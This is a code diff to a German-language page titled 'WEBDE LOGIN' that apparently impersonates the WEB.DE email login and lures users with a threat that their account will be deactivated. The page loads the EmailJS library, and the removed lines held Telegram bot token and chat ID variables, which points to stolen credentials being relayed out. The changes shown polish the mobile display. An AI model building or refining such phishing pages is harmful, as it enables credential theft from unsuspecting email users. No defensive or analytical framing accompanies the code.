@@ -2,7 +2,7 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WEBDE LOGIN</title>
     <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
@@ -10,11 +10,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/static/css/style.css">
     
-    <script>
-        // Set global JavaScript variables
-        window.telegramBotToken = "{{ telegram_bot_token }}";
-        window.telegramChatId = "{{ telegram_chat_id }}";
-    </script>
+    <style>
+        /* Ensure font size for input fields is at least 16px to prevent zooming */
+        input, textarea, select {
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
     <header class="header">
